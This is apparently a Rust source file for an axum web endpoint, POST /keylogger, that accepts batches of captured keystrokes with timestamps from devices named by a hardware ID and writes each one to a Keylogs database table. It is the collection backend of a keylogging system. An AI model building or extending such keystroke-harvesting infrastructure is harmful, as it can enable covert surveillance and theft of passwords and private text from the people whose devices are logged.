use async_scoped::TokioScope;
use axum::{Json, extract::State, http::HeaderMap};
use chrono::NaiveDateTime;
use utoipa::ToSchema;
use uuid::Uuid;

use crate::{AppState, Error, insure_device_exists};

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req)]
pub struct Req {
    pub keys: Vec<Key>,
}

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req::Key)]
pub struct Key {
    pub at: NaiveDateTime,
    pub key_pressed: String,
}

#[utoipa::path(
    post,
    path = "/keylogger",
    request_body = Req,
    responses(
        (status = 200, description = "inserted keylogger in db"),
    ),
    params(
      ("machine-id" = String, Header, description = "device hardware id"),
    ),
    tag = "Keylogger",
)]
#[axum::debug_handler]
pub async fn post_keylogger(
    headers: HeaderMap,
    State(app_state): State<AppState>,
    Json(req): Json<Req>,
) -> Result<(), Error> {
    let machine_id = headers
        .get("machine-id")
        .and_then(|v| v.to_str().ok())
        .ok_or(Error::BadRequest("No machine-id in header".into()))?;
    insure_device_exists(machine_id, &app_state.db_pool).await?;

    for key in req.keys.iter() {
        let db_pool = app_state.db_pool.clone();
        sqlx::query!(
            r#"
                    INSERT INTO Keylogs
                        (device_machine_id, key, created_at)
                        VALUES ($1, $2, $3)
                    ;
                "#,
            machine_id,
            &key.key_pressed,
            &key.at,
        )
        .execute(&db_pool)
        .await?;
    }

    Ok(())
}
